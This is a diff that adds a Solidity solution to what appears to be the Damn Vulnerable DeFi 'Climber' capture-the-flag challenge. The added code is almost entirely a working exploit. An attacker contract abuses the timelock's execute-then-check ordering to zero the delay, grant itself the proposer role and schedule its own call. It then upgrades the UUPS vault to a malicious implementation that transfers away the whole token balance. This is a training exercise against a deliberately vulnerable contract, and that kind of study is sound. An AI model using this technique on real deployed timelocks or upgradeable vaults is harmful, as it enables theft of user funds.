@@ -7,6 +7,9 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +88,14 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        MalicousContract malicousContract = new MalicousContract(
+            address(timelock),
+            address(vault),
+            player,
+            recovery,
+            address(token)
+        );
+        malicousContract.exploit();
     }
 
     /**
@@ -96,3 +106,119 @@ contract ClimberChallenge is Test {
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
 }
+
+
+contract MalicousContract {
+    ClimberTimelock public timelock;
+    ClimberVault public vault;
+    DamnValuableToken public token;
+    address public player;
+    address public recovery;
+    MaliciousVault maliciousVault;
+
+    constructor(address _timelock, address _vault, address _player, address _recovery, address _token) {
+        timelock = ClimberTimelock(payable(_timelock));
+        vault = ClimberVault(_vault);
+        player = _player;
+        recovery = _recovery;
+        token = DamnValuableToken(_token);
+    }
+
+    function exploit() external {
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+
+        maliciousVault = new MaliciousVault();
+
+        // Step 1: Update delay to 0
+        targets[0] = address(timelock);
+        values[0] = 0;
+        dataElements[0] = abi.encodeCall(
+            timelock.updateDelay,
+            (uint64(0))
+        );
+
+        // Step 2: Grant PROPOSER_ROLE to the timelock itself
+        targets[1] = address(timelock);
+        values[1] = 0;
+        dataElements[1] = abi.encodeCall(
+            timelock.grantRole,
+            (keccak256("PROPOSER_ROLE"), address(this))
+        );
+
+
+        targets[2] = address(this);
+        values[2] = 0;
+        dataElements[2] = abi.encodeCall(
+            this.schedule,
+            ()
+        );
+
+        // Step 4: Upgrade vault to malicious implementation
+        targets[3] = address(vault);
+        values[3] = 0;
+        dataElements[3] = abi.encodeCall(
+            vault.upgradeToAndCall,
+            (
+                address(maliciousVault),
+                abi.encodeCall(MaliciousVault.steal, (address(token), recovery))
+            )
+        );
+
+        // Execute the operation
+        timelock.execute(targets, values, dataElements, bytes32(0));
+    }
+
+    function schedule() public {
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+
+        // Step 1: Update delay to 0
+        targets[0] = address(timelock);
+        values[0] = 0;
+        dataElements[0] = abi.encodeCall(
+            timelock.updateDelay,
+            (uint64(0))
+        );
+
+        // Step 2: Grant PROPOSER_ROLE to the timelock itself
+        targets[1] = address(timelock);
+        values[1] = 0;
+        dataElements[1] = abi.encodeCall(
+            timelock.grantRole,
+            (keccak256("PROPOSER_ROLE"), address(this))
+        );
+
+        // Step 3: Schedule the SAME operation we're executing now
+        // This is the key - we're scheduling the SAME operation we're currently executing
+        targets[2] = address(this);
+        values[2] = 0;
+        dataElements[2] = abi.encodeCall(
+            this.schedule,
+            ()
+        );
+
+        // Step 4: Upgrade vault to malicious implementation
+        targets[3] = address(vault);
+        values[3] = 0;
+        dataElements[3] = abi.encodeCall(
+            vault.upgradeToAndCall,
+            (
+                address(maliciousVault),
+                abi.encodeCall(MaliciousVault.steal, (address(token), recovery))
+            )
+        );
+
+        // Execute the operation
+        timelock.schedule(targets, values, dataElements, bytes32(0));
+    }
+}
+
+contract MaliciousVault is ClimberVault {
+    function steal(address token, address recipient) external {
+        IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
+    }
+}
+
